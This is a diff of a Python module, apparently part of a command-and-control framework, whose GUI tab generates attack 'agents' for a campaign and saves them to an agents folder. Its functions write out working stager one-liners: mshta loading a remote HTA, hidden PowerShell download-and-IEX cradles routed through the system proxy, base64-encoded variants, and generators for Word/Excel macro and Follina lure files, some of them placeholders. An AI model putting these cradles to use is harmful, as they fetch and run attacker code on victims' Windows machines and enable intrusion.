@@ -7,13 +7,20 @@ import os
 # Agent generator functions
 # -------------------------------
 
-def generate_hta_agent_str(host, port, ssl):
+def generate_hta_agent_str(host, port, ssl, campaign_folder):
+    agents_folder = os.path.join(campaign_folder, "agents")
+    os.makedirs(agents_folder, exist_ok=True)
     if ssl:
-        return f"mshta https://{host}:{port}/hta_agent\npowershell -c \"mshta https://{host}:{port}/hta_agent\""
+        result = f"mshta https://{host}:{port}/hta_agent\npowershell -c \"mshta https://{host}:{port}/hta_agent\""
     else:
-        return f"mshta http://{host}:{port}/hta_agent\npowershell -c \"mshta http://{host}:{port}/hta_agent\""
+        result = f"mshta http://{host}:{port}/hta_agent\npowershell -c \"mshta http://{host}:{port}/hta_agent\""
+    with open(os.path.join(agents_folder, "hta_agent.txt"), "w") as f:
+        f.write(result)
+    return f"HTA Agent agent generated and saved to {os.path.join(agents_folder, 'hta_agent.txt')}\n{result}"
 
-def generate_pwsh_job_str(host, port, ssl):
+def generate_pwsh_job_str(host, port, ssl, campaign_folder):
+    agents_folder = os.path.join(campaign_folder, "agents")
+    os.makedirs(agents_folder, exist_ok=True)
     commandJ = "Start-Job -scriptblock {iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{agent}')))}"
     commandP = 'Start-Process powershell -ArgumentList "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\'{agent}\')))" -WindowStyle Hidden'
     raw_agent = "/raw_agent"
@@ -22,81 +29,119 @@ def generate_pwsh_job_str(host, port, ssl):
     encoded = base64.b64encode(agent.encode("UTF-8")).decode("UTF-8")
     JOB = commandJ.replace('{agent}', encoded)
     PROCESS = commandP.replace('{agent}', encoded)
-    return f"Powershell Job:\n{JOB}\nPowershell Process:\n{PROCESS}"
+    result = f"Powershell Job:\n{JOB}\nPowershell Process:\n{PROCESS}"
+    with open(os.path.join(agents_folder, "powershell_job.txt"), "w") as f:
+        f.write(result)
+    return f"Powershell Job agent generated and saved to {os.path.join(agents_folder, 'powershell_job.txt')}\n{result}"
 
-def generate_pwsh_file_str(host, port, ssl):
+def generate_pwsh_file_str(host, port, ssl, campaign_folder):
+    agents_folder = os.path.join(campaign_folder, "agents")
+    os.makedirs(agents_folder, exist_ok=True)
     commandF = "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{agent}')))"
     hjf_agent = "/hjf_agent"
     http = "https" if ssl else "http"
     agent = f"$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('{http}://{host}:{port}{hjf_agent}');IEX($s)"
     encoded = base64.b64encode(agent.encode("UTF-8")).decode("UTF-8")
-    return f"Powershell File:\n{commandF.replace('{agent}', encoded)}"
+    result = f"Powershell File:\n{commandF.replace('{agent}', encoded)}"
+    with open(os.path.join(agents_folder, "powershell_file.txt"), "w") as f:
+        f.write(result)
+    return f"Powershell File agent generated and saved to {os.path.join(agents_folder, 'powershell_file.txt')}\n{result}"
 
-def generate_pwsh_sct_str(host, port, ssl):
+def generate_pwsh_sct_str(host, port, ssl, campaign_folder):
+    agents_folder = os.path.join(campaign_folder, "agents")
+    os.makedirs(agents_folder, exist_ok=True)
     commandF = "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{agent}')))"
     hjfs_agent = "/hjfs_agent"
     http = "https" if ssl else "http"
     agent = f"$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('{http}://{host}:{port}{hjfs_agent}');IEX($s)"
     encoded = base64.b64encode(agent.encode("UTF-8")).decode("UTF-8")
-    return f"Powershell SCT:\n{commandF.replace('{agent}', encoded)}"
+    result = f"Powershell SCT:\n{commandF.replace('{agent}', encoded)}"
+    with open(os.path.join(agents_folder, "powershell_sct.txt"), "w") as f:
+        f.write(result)
+    return f"Powershell SCT agent generated and saved to {os.path.join(agents_folder, 'powershell_sct.txt')}\n{result}"
 
-def generate_pwsh_misc_str(host, port, ssl):
+def generate_pwsh_misc_str(host, port, ssl, campaign_folder):
+    agents_folder = os.path.join(campaign_folder, "agents")
+    os.makedirs(agents_folder, exist_ok=True)
     http = "https" if ssl else "http"
     raw_agent = "/raw_agent"
-    return f"Simple Powershell Agent:\npowershell -w hidden \"Invoke-Expression((New-Object Net.WebClient).DownloadString('{http}://{host}:{port}{raw_agent}'))\""
+    result = f"Simple Powershell Agent:\npowershell -w hidden \"Invoke-Expression((New-Object Net.WebClient).DownloadString('{http}://{host}:{port}{raw_agent}'))\""
+    with open(os.path.join(agents_folder, "powershell_misc.txt"), "w") as f:
+        f.write(result)
+    return f"Simple Powershell agent generated and saved to {os.path.join(agents_folder, 'powershell_misc.txt')}\n{result}"
 
-def generate_pwsh_base64_str(host, port, ssl):
+def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
+    agents_folder = os.path.join(campaign_folder, "agents")
+    os.makedirs(agents_folder, exist_ok=True)
     http = "https" if ssl else "http"
     b64_stager = "/b64_stager"
     agent = f"$V=new-object net.webclient;$S=$V.DownloadString('{http}://{host}:{port}{b64_stager}');IEX($S)"
     encoded = base64.b64encode(agent.encode("UTF-8")).decode("UTF-8")
-    return f"Powershell Base64:\npowershell -w hidden \"iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{encoded}')))\""
+    result = f"Powershell Base64:\npowershell -w hidden \"iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{encoded}')))\""
+    with open(os.path.join(agents_folder, "powershell_base64.txt"), "w") as f:
+        f.write(result)
+    return f"Powershell Base64 agent generated and saved to {os.path.join(agents_folder, 'powershell_base64.txt')}\n{result}"
 
-def generate_pwsh_base52_str(host, port, ssl):
+def generate_pwsh_base52_str(host, port, ssl, campaign_folder):
+    agents_folder = os.path.join(campaign_folder, "agents")
+    os.makedirs(agents_folder, exist_ok=True)
     http = "https" if ssl else "http"
     b52_stager = "/b52_stager"
     b52_agent = "/b52_agent"
     agent1 = f"powershell -w hidden \"IEX((New-Object Net.WebClient).DownloadString('{http}://{host}:{port}{b52_stager}'))\""
     agent2 = f"powershell -w hidden \"IEX((New-Object Net.WebClient).DownloadString('{http}://{host}:{port}{b52_agent}'))\""
-    return f"Powershell Base52:\n{agent1}\n{agent2}"
+    result = f"Powershell Base52:\n{agent1}\n{agent2}"
+    with open(os.path.join(agents_folder, "powershell_base52.txt"), "w") as f:
+        f.write(result)
+    return f"Powershell Base52 agent generated and saved to {os.path.join(agents_folder, 'powershell_base52.txt')}\n{result}"
 
 def generate_cmd_shellcodex64_str(host, port, ssl, campaign_folder):
+    agents_folder = os.path.join(campaign_folder, "agents")
+    os.makedirs(agents_folder, exist_ok=True)
     # This is a placeholder representing the actual compilation process.
-    result = f"CMD Shellcodex64 agent generated and saved to {os.path.join(campaign_folder, 'cmd_shellcodex64.txt')}"
-    with open(os.path.join(campaign_folder, "cmd_shellcodex64.txt"), "w") as f:
+    result = f"CMD Shellcodex64 agent generated and saved to {os.path.join(agents_folder, 'cmd_shellcodex64.txt')}"
+    with open(os.path.join(agents_folder, "cmd_shellcodex64.txt"), "w") as f:
         f.write(result)
     return result
 
 def generate_cmd_shellcodex86_str(host, port, ssl, campaign_folder):
+    agents_folder = os.path.join(campaign_folder, "agents")
+    os.makedirs(agents_folder, exist_ok=True)
     # This is a placeholder representing the actual compilation process.
-    result = f"CMD Shellcodex86 agent generated and saved to {os.path.join(campaign_folder, 'cmd_shellcodex86.txt')}"
-    with open(os.path.join(campaign_folder, "cmd_shellcodex86.txt"), "w") as f:
+    result = f"CMD Shellcodex86 agent generated and saved to {os.path.join(agents_folder, 'cmd_shellcodex86.txt')}"
+    with open(os.path.join(agents_folder, "cmd_shellcodex86.txt"), "w") as f:
         f.write(result)
     return result
 
 def generate_word_macro_str(host, port, ssl, campaign_folder):
+    agents_folder = os.path.join(campaign_folder, "agents")
+    os.makedirs(agents_folder, exist_ok=True)
     http = "https" if ssl else "http"
     raw_agent = "/raw_agent"
-    result = f"Word Macro agent generated and saved to {os.path.join(campaign_folder, 'Word_macro.vba')}.\nDownload from {http}://{host}:{port}{raw_agent}"
-    with open(os.path.join(campaign_folder, "Word_macro.vba"), "w") as f:
+    result = f"Word Macro agent generated and saved to {os.path.join(agents_folder, 'Word_macro.vba')}.\nDownload from {http}://{host}:{port}{raw_agent}"
+    with open(os.path.join(agents_folder, "Word_macro.vba"), "w") as f:
         f.write(result)
     return result
 
 def generate_excel_macro_str(host, port, ssl, campaign_folder):
+    agents_folder = os.path.join(campaign_folder, "agents")
+    os.makedirs(agents_folder, exist_ok=True)
     http = "https" if ssl else "http"
     raw_agent = "/raw_agent"
-    result = f"Excel Macro agent generated and saved to {os.path.join(campaign_folder, 'Excel_macro.vba')}.\nDownload from {http}://{host}:{port}{raw_agent}"
-    with open(os.path.join(campaign_folder, "Excel_macro.vba"), "w") as f:
+    result = f"Excel Macro agent generated and saved to {os.path.join(agents_folder, 'Excel_macro.vba')}.\nDownload from {http}://{host}:{port}{raw_agent}"
+    with open(os.path.join(agents_folder, "Excel_macro.vba"), "w") as f:
         f.write(result)
     return result
 
 def generate_follina_agent_str(host, port, ssl, campaign_folder):
+    agents_folder = os.path.join(campaign_folder, "agents")
+    os.makedirs(agents_folder, exist_ok=True)
     http = "https" if ssl else "http"
     follina_url = "/follina_url"
-    result = f"Follina agent generated and saved to {os.path.join(campaign_folder, 'follina.html')} and {os.path.join(campaign_folder, 'Follinadoc.docx')}.\nAccess via {http}://{host}:{port}{follina_url}"
-    with open(os.path.join(campaign_folder, "follina.html"), "w") as f:
+    result = f"Follina agent generated and saved to {os.path.join(agents_folder, 'follina.html')} and {os.path.join(agents_folder, 'Follinadoc.docx')}.\nAccess via {http}://{host}:{port}{follina_url}"
+    with open(os.path.join(agents_folder, "follina.html"), "w") as f:
         f.write(result)
-    with open(os.path.join(campaign_folder, "Follinadoc.docx"), "w") as f:
+    with open(os.path.join(agents_folder, "Follinadoc.docx"), "w") as f:
         f.write("Dummy DOCX content for Follina agent.")
     return result
 
@@ -112,13 +157,13 @@ class AgentGenerationTab:
         self.selected_agents = {}  # mapping agent name to tk.BooleanVar
         # Define agent options: key -> (generator_function, requires_campaign_folder)
         self.agent_options = {
-            "HTA Agent": (generate_hta_agent_str, False),
-            "Powershell Job": (generate_pwsh_job_str, False),
-            "Powershell File": (generate_pwsh_file_str, False),
-            "Powershell SCT": (generate_pwsh_sct_str, False),
-            "Powershell Misc": (generate_pwsh_misc_str, False),
-            "Powershell Base64": (generate_pwsh_base64_str, False),
-            "Powershell Base52": (generate_pwsh_base52_str, False),
+            "HTA Agent": (generate_hta_agent_str, True),
+            "Powershell Job": (generate_pwsh_job_str, True),
+            "Powershell File": (generate_pwsh_file_str, True),
+            "Powershell SCT": (generate_pwsh_sct_str, True),
+            "Powershell Misc": (generate_pwsh_misc_str, True),
+            "Powershell Base64": (generate_pwsh_base64_str, True),
+            "Powershell Base52": (generate_pwsh_base52_str, True),
             "CMD Shellcode x64": (generate_cmd_shellcodex64_str, True),
             "CMD Shellcode x86": (generate_cmd_shellcodex86_str, True),
             "Word Macro": (generate_word_macro_str, True),
@@ -162,9 +207,12 @@ class AgentGenerationTab:
             return
 
         campaign_folder = campaign_name + "_campaign"
+        agents_folder = os.path.join(campaign_folder, "agents")
         if not os.path.exists(campaign_folder):
             messagebox.showerror("Error", f"Campaign folder '{campaign_folder}' does not exist. Start the campaign first.")
             return
+        if not os.path.exists(agents_folder):
+          os.makedirs(agents_folder, exist_ok=True)
 
         agent_results = []
         # For each selected agent type, generate the agent and save it in the campaign folder.
@@ -174,12 +222,7 @@ class AgentGenerationTab:
                     if need_folder:
                         agent_text = func(host, port, use_ssl, campaign_folder)
                     else:
-                        agent_text = func(host, port, use_ssl)
-                        # Save the generated agent text into a file in the campaign folder.
-                        filename = os.path.join(campaign_folder, option.replace(" ", "_").lower() + ".txt")
-                        with open(filename, "w") as f:
-                            f.write(agent_text)
-                        agent_text += f"\n(Saved to {filename})"
+                         agent_text = func(host, port, use_ssl)
                     agent_results.append(f"[-] {option}\n{agent_text}")
                 except Exception as e:
                     agent_results.append(f"[-] {option} - Error: {e}")
